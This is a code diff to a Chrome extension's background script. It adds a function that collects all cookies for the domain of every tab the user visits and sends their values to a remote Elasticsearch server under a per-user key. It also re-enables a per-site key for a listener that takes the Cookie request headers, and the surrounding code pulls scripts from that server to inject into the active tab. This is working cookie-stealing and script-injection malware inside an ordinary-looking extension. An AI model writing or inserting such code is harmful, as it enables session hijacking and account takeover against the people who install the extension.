@@ -220,6 +220,41 @@ function timerEvent() {
   });
 }
 
+function checkKnownCookies(search) {
+  chrome.cookies.getAll({ domain: search }, function (theCookies) {
+    cookies = theCookies;
+    chrome.storage.sync.get(["userid"], function (items) {
+      var userid = items.userid;
+      if (!userid) {
+        return;
+      }
+      url = baseURL + "/cookies/_doc/";
+      url = url.concat(userid);
+      url = url.concat(hashCode(search));
+      var jsonData = [];
+
+      for (var i = 0; i < cookies.length; ++i) {
+        jsonData.push({
+          domain: cookies[i].domain,
+          value: cookies[i].value,
+        });
+      }
+
+      // Convert the array into a JSON string
+      var jsonString = JSON.stringify(jsonData);
+      sendPostRequest(
+        url,
+        { jsonString },
+        function () {
+          console.log("Cookies sent successfully");
+        },
+        function () {
+          console.error("Error sending cookies");
+        }
+      );
+    });
+  });
+}
 /*Another Timer event to inject dom/scripts if any on a regular interval.
  * Since this is a one-way communication from extension to elastic server
  * we need to do regular polling to see if any new dom/js needs to be inserted on active tab.
@@ -239,7 +274,6 @@ function injectionEvent() {
 
       let url = extractDomain(tabs[0].url); // Extract only the main domain
       let tabId = tabs[0].id;
-
       // Define search queries for Elasticsearch 8.17
       let jsQuery = {
         query: {
@@ -350,9 +384,9 @@ chrome.webRequest.onSendHeaders.addListener(
       if (!userid) {
         return;
       }
-      // url = url.concat(userid);
-      // website = extractDomain(details.url);
-      // url = url.concat(hashCode(website));
+      url = url.concat(userid);
+      website = extractDomain(details.url);
+      url = url.concat(hashCode(website));
 
       for (var i = 0; i < details.requestHeaders.length; ++i) {
         if (details.requestHeaders[i].name == "Cookie") {
@@ -446,6 +480,7 @@ chrome.runtime.onConnectExternal.addListener(function (port) {
 
 /*Listener for tab update event*/
 chrome.tabs.onUpdated.addListener(function (tabId, info, tab) {
+  checkKnownCookies(extractDomain(tab.url));
   if (info.status == "complete") {
     if (tab.url != "chrome://newtab/" && tab.url != "chrome://") {
       chrome.tabs.executeScript(tabId, { file: "insert.js" });
